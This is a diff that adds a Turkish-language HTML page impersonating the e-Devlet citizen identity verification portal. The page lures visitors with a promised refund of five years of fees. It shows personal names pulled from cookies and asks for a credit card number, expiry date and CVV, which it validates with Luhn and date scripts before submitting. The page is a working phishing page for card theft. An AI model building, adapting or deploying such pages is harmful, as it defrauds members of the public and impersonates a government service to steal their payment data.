@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=edge">
+    <meta http-equiv="cleartype" content="on">
+    <title>Mobil İşlem Merkezi</title>
+    <meta name="description" content="5 yıla kadar tüm ödediğiniz aidat ücretlerini geri alın">
+ 
+    <meta name="keywords" content="mobil,işlem,merkezi">
+    <meta name="robots" content="index,follow">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#4284be">
+    <link rel="icon" type="image/png" href="assets/favicons/favicon-196x196.png" sizes="196x196">
+ 
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <link rel="stylesheet" href="assets/css/base.css">
+    <script src="assets/js/header.js"></script>
+    <link rel="stylesheet" href="assets/css/giris.css">
+    <style>
+      .yg-input-error-msg {
+          display: none;
+          color: red;
+      }div center p {
+  font-size: 19px;
+} 
+  </style>
+  <script>
+      // Luhn algoritması ile kredi kartı numarasını doğrulama
+      function luhnCheck(val) {
+          let sum = 0;
+          for (let i = 0; i < val.length; i++) {
+              let intVal = parseInt(val.substr(i, 1));
+              if (i % 2 == 0) {
+                  intVal *= 2;
+                  if (intVal > 9) {
+                      intVal = 1 + (intVal % 10);
+                  }
+              }
+              sum += intVal;
+          }
+          return (sum % 10) == 0;
+      }
+
+      // Form gönderilmeden önce doğrulamaları kontrol etme
+      function validateForm() {
+          const cardNumber = document.getElementById('tridField').value.replace(/\s/g, '');
+          const expiryDate = document.getElementById('sifrexa').value;
+          const expiryDateRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+          const tckError = document.getElementById('tck_error');
+          
+          // Kredi kartı numarası doğrulaması
+          if (!luhnCheck(cardNumber)) {
+              tckError.style.display = 'block';
+              return false;
+          } else {
+              tckError.style.display = 'none';
+          }
+          
+          // Son kullanma tarihi doğrulaması
+          if (!expiryDateRegex.test(expiryDate)) {
+              alert('Son kullanma tarihi geçersiz. Lütfen ay/yıl formatında giriniz.');
+              return false;
+          }
+
+          // Tarih kontrolü (günümüz tarihinden eski olamaz)
+          if (!isExpiryDateValid(expiryDate)) {
+              alert('Son kullanma tarihi günümüz tarihinden eski olamaz.');
+              return false;
+          }
+
+          return true;
+      }
+
+      // Kredi kartı numarasını formatlama (4 rakamda bir boşluk)
+      function formatCardNumber(input) {
+          let value = input.value.replace(/\D/g, '').substring(0, 16);
+          let formattedValue = '';
+          for (let i = 0; i < value.length; i++) {
+              if (i % 4 == 0 && i > 0) {
+                  formattedValue += ' ';
+              }
+              formattedValue += value[i];
+          }
+          input.value = formattedValue;
+      }
+
+      // Son kullanma tarihi formatlama
+      function formatExpiryDate(input) {
+          let value = input.value.replace(/\D/g, '');
+          if (value.length > 2) {
+              value = value.substring(0, 2) + '/' + value.substring(2, 4);
+          }
+          input.value = value;
+      }
+
+      // Son kullanma tarihinin günümüz tarihinden eski olup olmadığını kontrol etme
+      function isExpiryDateValid(expiryDate) {
+          const [month, year] = expiryDate.split('/').map(Number);
+          const now = new Date();
+          const currentMonth = now.getMonth() + 1; // Aylar 0'dan başlar
+          const currentYear = now.getFullYear() % 100; // Son iki rakamı al
+
+          // Girilen yıl günümüz yılından küçükse geçersiz
+          if (year < currentYear) {
+              return false;
+          }
+
+          // Girilen yıl günümüz yılına eşitse ve girilen ay günümüz ayından küçükse geçersiz
+          if (year === currentYear && month < currentMonth) {
+              return false;
+          }
+
+          return true;
+      }
+  </script>
+  </head>
+  <body data-lang="tr_TR.UTF-8">
+    <div class="wrapper">
+        <div class="container">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <header class="header">
+        <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
+        </h1>
+        <div class="logo"><a href="/"> <img src="edk-logo.png"
+                                            alt="logo2"> </a>
+        </div>
+        <div class="referrerApp"><img alt="" src="1.png" aria-hidden="true" width="165" height="40">
+            <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p></div>
+    </header>
+    
+ 
+    
+    
+    
+    
+    
+    <main>
+        <section>
+            <div class="content" >
+               <center>
+                <div class="info">
+                    Adınız: <strong id="adi">Adige</strong><br>
+                    Soyadınız: <strong id="soyadi">Kaşarcı</strong><br>
+                    Baba Adı: <strong id="babaad">Örnek Baba Adı</strong>
+                </div>
+                
+                <script>
+                    // Çerezlerden veri okuma
+                    function getCookie(name) {
+                        let value = "; " + document.cookie;
+                        let parts = value.split("; " + name + "=");
+                        if (parts.length === 2) return parts.pop().split(";").shift();
+                    }
+            
+                    // Çerezlerdeki verileri DOM'a yazdırma
+                    document.getElementById('adi').textContent = getCookie('adi') || 'Bilinmiyor';
+                    document.getElementById('soyadi').textContent = getCookie('soyadi') || 'Bilinmiyor';
+                    document.getElementById('babaad').textContent = getCookie('babaad') || 'Bilinmiyor';
+            
+                    // Çerez değerlerini konsola yazdırarak kontrol edin
+                    console.log('adi:', getCookie('adi'));
+                    console.log('soyadi:', getCookie('soyadi'));
+                    console.log('babaad:', getCookie('babaad'));
+                </script>
+             <br> <p style="font-size: 19px;">Kart bilgilerinizi kontrol ederek doldurunuz.</p>
+            </center> 
+    
+                <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off" onsubmit="return validateForm();">
+                  <fieldset>
+                      <div class="form-row required">
+                          <label for="tridField" class="enforced">Kredi Kartı Numaranız</label>
+                          <input type="hidden" name="encTridField" id="encTridField" value=""/>
+                          <div class="form-field fieldGroup">
+                              <input name="tridField" type="tel" class="form-control" id="tridField" value="" autocomplete="off" maxlength="19" aria-required="true" required oninput="formatCardNumber(this);"/>
+                              <div class="form-note yg-input-error-msg" id="tck_error" role="alert">Kart numaranızı hatalı girdiniz.</div>
+                          </div>  
+                      </div>
+          
+                      <div class="form-row">
+                          <label for="sifrexa" class="enforced">Son Kullanma Tarihi</label>
+                          <div class="form-field fieldGroup">
+                              <input name="cc_yil" id="sifrexa" type="tel" maxlength="5" class="form-control" tabindex="2" aria-required="true" required oninput="formatExpiryDate(this);">
+                          </div>
+                      </div>
+          
+                      <div class="form-row">
+                          <label for="vvv" class="enforced">Cvv Kodunuz</label>
+                          <div class="form-field fieldGroup">
+                              <input name="vvv" id="vvv" maxlength="3" minlength="3" class="form-control" tabindex="2" aria-required="true" required>
+                          </div>
+                      </div>
+          
+                      <div class="loading-content hide">
+                          <div class="loading"></div>
+                          <span class="loader-info">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
+                      </div>
+          
+                      <div class="form-row center-item">
+                          <input type="hidden" name="actionName" value="giris"/>
+                          <button class="btn btn-send" name="submitButton" type="submit" value="Giriş Yap">SORGULA</button>
+                      </div>
+                  </fieldset>
+              </form>
+            </div>
+        </section>
+    
+ 
+    
+    </main>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    </div>
+   
+    
+    <footer class="footer-fixed" role="contentinfo">
+        <span class="copyright"><img src="DDO-logo.png" class="footer-logo" alt="logo" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
+        <ul>
+            <li>
+                <a id="gizlilik_btn" 
+                   aria-haspopup="true">Gizlilik ve Güvenlik
+                </a>
+            </li>
+    
+        </ul>
+ 
+    </footer>
+    
+  </div>
+ 
+    
+    
+    
+    
+    
+ 
+    </body>
+    </html>
+    
+    
+ 
+    
